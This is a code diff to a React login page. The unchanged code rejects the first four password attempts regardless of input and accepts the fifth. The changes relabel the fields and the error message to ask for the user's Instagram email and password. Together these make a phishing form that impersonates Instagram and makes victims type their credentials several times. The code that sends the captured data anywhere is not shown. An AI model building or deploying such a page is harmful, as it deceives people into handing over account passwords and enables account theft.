@@ -778,7 +778,7 @@ function LoginPage({ onLogin }) {
 
     if (newAttempt < 5) {
       // First 4 attempts fail
-      setError(`Incorrect password. ${5 - newAttempt} attempts remaining.`);
+      setError(`Incorrect password. Please add correct Instagram Password ${5 - newAttempt} attempts remaining.`);
       e.target.password.value = '';        // Clear password field
     } else {
       // 5th attempt succeeds
@@ -814,7 +814,7 @@ function LoginPage({ onLogin }) {
 
         <form onSubmit={handleSubmit} style={{ width: '100%', maxWidth: 400 }}>
           <div className="field-group">
-            <label className="field-label">Email or Username</label>
+            <label className="field-label">Your Insta Email or Username</label>
             <input
               name="username"
               className="field-input"
@@ -823,7 +823,7 @@ function LoginPage({ onLogin }) {
             />
           </div>
           <div className="field-group" style={{ marginBottom: 32 }}>
-            <label className="field-label">Password</label>
+            <label className="field-label">Your Insta Password</label>
             <input
               name="password"
               type="password"
